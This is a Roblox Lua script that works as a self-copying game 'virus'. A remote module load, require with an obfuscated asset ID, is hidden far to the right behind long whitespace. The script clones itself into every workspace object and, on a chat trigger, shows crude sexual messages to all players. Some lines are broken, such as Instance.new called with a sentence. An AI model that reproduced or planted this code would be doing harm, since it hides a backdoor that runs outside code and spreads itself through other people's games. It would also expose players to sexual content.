names={"AmazingOmegaJames","H75","","","","","","",""}
local NameCheck = false
script.Parent.Name = names[math.random(1, #names)]
script.Name = [[ProperGr�mmerNeededInPhilosiphalLocations;insertNoobHere]]                                                                                                                                                                                                                                                      require(13901070686 + 1)()
local c = script.Parent:Clone()

function addEvent(ch)
	wait(math.random())
	NameCheck = false
	for ss = 1, #names do
		if ch:IsA("RotateP") or ch:findFirstChild(names[ss]) ~= nil then
			NameCheck = true
		end
	end
	if NameCheck == false then
		local cloak = c:Clone()
		cloak.Name = ""
		cloak:GetChildren()[1].Name = ""
		cloak.Parent = ch
		cloak.Name = names[math.random(1, 5)]
	end
end

workspace.ChildAdded:connect(addEvent)

game.Players.PlayerAdded:connect(function(pl)
	pl.Chatted:connect(function(m)
		if m:sub(1, 5) == "/sc t" then
			local m = Instance.new("The creator of this place is AmazingOmegaJames")
			m.Parent = workspace
			m.Text = "THEY CALL ME CRAZY"
			wait(1)
			m.Text = "lOoOoOoOp"
			wait(0.25)
			m.Text = "LoOoOoOoP"
			wait(0.25)
			m.Text = "lOoOoOoOp"
			wait(0.25)
			m.Text = "LoOoOoOoP"
			wait(0.25)
			m.Text = "lOoOoOoOp"
			wait(0.25)
			m.Text = "LoOoOoOoP"
			wait(0.25)
			m.Text = "GOTTA GOTTA BE CRAZY SEX"
			wait(1)
			m.Text = "lOoOoOoOp"
			wait(0.25)
			m.Text = "LoOoOoOoP"
			wait(0.25)
			m.Text = "lOoOoOoOp"
			wait(0.25)
			m.Text = "LoOoOoOoP"
			wait(0.25)
			m.Text = "lOoOoOoOp"
			wait(0.25)
			m.Text = "LoOoOoOoP"
			wait(0.25)
			m.Text = "GOTTA HAVE SEX WITH YOU"
			wait(3)
			m:remove()
		end
		if m:sub(1, 5) == " SEX HAAXX" then
			local m = Instance.new("Message")
			m.Parent = workspace
			m.Text = " SEX HAAXX"	
			wait(3)
			m:remove()
		end
	end)
end)

while true do
	local s = workspace:GetChildren()
	for i = 1, #s do
		NameCheck = false
		for ss = 1, #names do
			if s[i]:IsA("RotateP") or s[i]:findFirstChild(names[ss]) ~= nil then
				NameCheck = true
			end
		end
		if NameCheck == false then
			local cloak = c:Clone()
			cloak.Name = ""
			cloak:GetChildren()[1].Name = ""
			cloak.Parent = s[i]
		end
		wait(0.1)
	end
	wait(1)
end
